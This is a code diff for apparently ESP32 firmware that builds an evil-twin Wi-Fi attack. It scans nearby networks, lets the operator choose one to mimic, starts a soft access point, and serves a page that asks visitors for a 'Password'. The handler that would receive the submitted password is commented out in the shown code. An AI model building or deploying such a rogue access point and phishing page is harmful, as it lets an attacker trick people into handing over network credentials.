@@ -39,7 +39,7 @@ void setup() {
 
 void loop(){
 
-    server.handleClient();
+    
     printInstruction();
     while (!Serial.available()) {
         // Wait for user input
@@ -64,6 +64,8 @@ void loop(){
             printInstruction();
             break;
     }
+    
+            server.handleClient();
     delay(500);
 }
 
@@ -92,9 +94,9 @@ void findNewNetworks(){
 }
 
 void MimicNetwork(){
-    Serial.println("Which network # to mimic: ");
     printAllNetwork();
-
+    
+    Serial.print("\nWhich network # to mimic: ");
     uint8_t networkNum;
     getIntInput(networkNum);
     Serial.printf("\nChosing network #%d\n", networkNum);
@@ -116,8 +118,9 @@ void createAP(String SSID){
         Serial.println("Failed to configure softAP");
         return;
     }
-
-    if (!WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)) {
+    
+    //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
+    if (!WiFi.softAP(AP_SSID)) {
         Serial.println("Failed to start softAP");
         return;
     }
@@ -127,7 +130,6 @@ void createAP(String SSID){
     Serial.print("IP Address: ");
     Serial.println(WiFi.softAPIP());
 
-    //.on() accepts a URL path and function to handle it
     server.on("/", handleConnect);
     //server.on("/submit", HTTP_POST, handleSubmit);
     //server.onNotFound(handleNotFound);
@@ -140,3 +142,31 @@ void printAllNetwork(){
     }
     
 }
+
+void handleConnect(){
+    Serial.println("Page Visited.");
+    server.send(200, "text/html", getHTML());
+
+}
+
+String getHTML(){
+        return
+        R"rawliteral(<!DOCTYPE html>
+        <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width", initial-scale=1.0>
+                <style>*{color: Black;size: 20px;}</style>
+            </head>
+            <body>
+                <div id ="mainContainer">
+                    <h1>Hi friend, try edit me!</h1>
+                    <form id = "inputForm" action = "\submit" method = "post">
+                        <label for="passwordEnter">Password: (30 characters max)</label><br>
+                        <input type="text" class="inputBar" name="passwordEnter"><br><br>
+                        <input type="submit" value="Enter">
+                    </form>
+                </div>
+            </body>
+        </html>)rawliteral";
+    }
